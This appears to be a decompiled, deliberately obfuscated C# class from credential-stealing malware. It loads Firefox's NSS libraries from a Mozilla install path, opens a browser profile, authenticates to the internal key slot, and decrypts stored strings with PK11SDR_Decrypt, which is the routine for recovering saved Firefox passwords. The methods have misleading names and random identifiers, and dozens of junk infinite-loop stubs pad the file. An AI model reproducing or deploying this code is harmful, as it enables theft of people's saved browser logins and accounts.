using System;
using System.Runtime.InteropServices;
using System.Text;

namespace vwGeL;

public class eMBVL
{
	private delegate int GffHP(ref peKGG data, ref peKGG result, int cx);

	private delegate int cEYDb(string configdir);

	private delegate long sTtFy();

	private delegate IntPtr RzXHR(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	private delegate int XTevL(IntPtr slot, bool loadCerts, long wincx);

	private delegate void SUdBv(IntPtr slot);

	private delegate IntPtr ZbIOh();

	private struct peKGG
	{
		private readonly int int_0;

		public readonly IntPtr intptr_0;

		public readonly int int_1;
	}

	private static bool FJuBI;

	private static IntPtr ZzyPF;

	private static IntPtr IzYCg;

	[DllImport("kernel32", SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr ptr, string str);

	[DllImport("kernel32", CharSet = CharSet.Auto)]
	public static extern IntPtr LoadLibrary(string name);

	public eMBVL()
	{
		ZzyPF = IntPtr.Zero;
	}

	public static bool AuthenticateSql(string string0, string string1)
	{
		if (Nss_Init(string1, string0) == 0)
		{
			ZzyPF = Pk11GetInternalKeySlotDelegate();
			if (ZzyPF != IntPtr.Zero && Pk11AuthenticateDelegate(ZzyPF, bool1: true, 0L) == 0)
			{
				FJuBI = true;
				return true;
			}
		}
		return false;
	}

	public static string GetPointerAsString(string str)
	{
		if (FJuBI)
		{
			IntPtr intPtr = NssBase64DecodeBufferDelegate(IntPtr.Zero, IntPtr.Zero, new StringBuilder(str), str.Length);
			if (intPtr != IntPtr.Zero)
			{
				peKGG tsecitem = (peKGG)Marshal.PtrToStructure(intPtr, typeof(peKGG));
				peKGG tsecitem2 = default(peKGG);
				if (tsecitem.int_1 > 0 && Dpk11SdrDecryptDelegate(ref tsecitem, ref tsecitem2, 0) == 0)
				{
					return Marshal.PtrToStringAnsi(tsecitem2.intptr_0, tsecitem2.int_1);
				}
			}
		}
		return string.Empty;
	}

	public static void GetSlot()
	{
		if (FJuBI)
		{
			Pk11FreeSlotDelegate(ZzyPF);
			NssShutdownDelegate();
		}
	}

	private static int Nss_Init(string profilePath, string mozillaPath)
	{
		LoadLibrary(mozillaPath + "MSVCR100.dll");
		LoadLibrary(mozillaPath + "msvcp100.dll");
		LoadLibrary(mozillaPath + "mozglue.dll");
		LoadLibrary(mozillaPath + "nspr4.dll");
		LoadLibrary(mozillaPath + "plc4.dll");
		LoadLibrary(mozillaPath + "plds4.dll");
		LoadLibrary(mozillaPath + "ssutil3.dll");
		LoadLibrary(mozillaPath + "sqlite3.dll");
		LoadLibrary(mozillaPath + "nssutil3.dll");
		LoadLibrary(mozillaPath + "mozcrt19.dll");
		LoadLibrary(mozillaPath + "mozsqlite3.dll");
		IzYCg = LoadLibrary(mozillaPath + "nss3.dll");
		if (IzYCg != IntPtr.Zero)
		{
			IntPtr procAddress = GetProcAddress(IzYCg, "NSS_Init");
			if (procAddress != IntPtr.Zero)
			{
				cEYDb cEYDb = (cEYDb)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(cEYDb));
				return cEYDb(profilePath);
			}
		}
		return -1;
	}

	private static void NssShutdownDelegate()
	{
		sTtFy sTtFy = (sTtFy)Marshal.GetDelegateForFunctionPointer(GetProcAddress(IzYCg, "NSS_Shutdown"), typeof(sTtFy));
		sTtFy();
	}

	private static void Pk11FreeSlotDelegate(IntPtr intptr2)
	{
		SUdBv sUdBv = (SUdBv)Marshal.GetDelegateForFunctionPointer(GetProcAddress(IzYCg, "PK11_FreeSlot"), typeof(SUdBv));
		sUdBv(intptr2);
	}

	private static IntPtr Pk11GetInternalKeySlotDelegate()
	{
		ZbIOh zbIOh = (ZbIOh)Marshal.GetDelegateForFunctionPointer(GetProcAddress(IzYCg, "PK11_GetInternalKeySlot"), typeof(ZbIOh));
		return zbIOh();
	}

	private static int Pk11AuthenticateDelegate(IntPtr intptr2, bool bool1, long long0)
	{
		XTevL xTevL = (XTevL)Marshal.GetDelegateForFunctionPointer(GetProcAddress(IzYCg, "PK11_Authenticate"), typeof(XTevL));
		return xTevL(intptr2, bool1, long0);
	}

	private static IntPtr NssBase64DecodeBufferDelegate(IntPtr intptr2, IntPtr intptr3, StringBuilder sBuilder, int int0)
	{
		RzXHR rzXHR = (RzXHR)Marshal.GetDelegateForFunctionPointer(GetProcAddress(IzYCg, "NSSBase64_DecodeBuffer"), typeof(RzXHR));
		return rzXHR(intptr2, intptr3, sBuilder, int0);
	}

	private static int Dpk11SdrDecryptDelegate(ref peKGG tsecitem0, ref peKGG tsecitem1, int int0)
	{
		GffHP gffHP = (GffHP)Marshal.GetDelegateForFunctionPointer(GetProcAddress(IzYCg, "PK11SDR_Decrypt"), typeof(GffHP));
		return gffHP(ref tsecitem0, ref tsecitem1, int0);
	}

	static void CQaJJ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void nXhnj()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void WWVaL()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void cTgqZ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void gEZxE()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void dmmlq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void CejwH()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void BxUpO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void OtDEC()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void xSuzN()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void yRzXH()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void peKGG()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void MBVLC()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void HBTQn()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void xGuaW()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void gcRlc()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void aXRjg()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void uOIxd()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void NwfhC()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void DdoiB()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void qLRZO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void kdOvx()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void sTtFy()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void bIOhp()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void YCgeM()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void rKVKH()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void brYex()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void QoSwg()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void WIMma()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void PsIau()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ogFUN()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void VmYcD()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void kfJLq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void DFwWk()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void EYDbs()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void qPKmo()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void dTVNm()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void GiChG()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void xIfMp()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Pfjmd()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void KXlSk()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void NOYhc()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ggvzD()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void EaZCj()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void IdRax()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void kwwMQ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void tVdpS()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void KYghq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void uDsYT()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void mONdT()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void aOiZQ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ltGiC()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void PheBk()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wxIfM()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Jojki()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Pfjmd()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void zpguF()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void XlSkW()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void uRnMS()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void YhcGV()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void zByEp()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void zDtTi()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wLVqE()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void jBmqQ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void EcUQc()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void sWYFZ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void QUryG()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Ljyrb()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void YHUtt()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void oHgHS()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void khsKY()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void oVbuD()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void IPWmO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void PtraO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void WKKlt()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void jXVPh()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Jabwx()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void rLTJo()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ZDePf()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void uqezp()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}
}
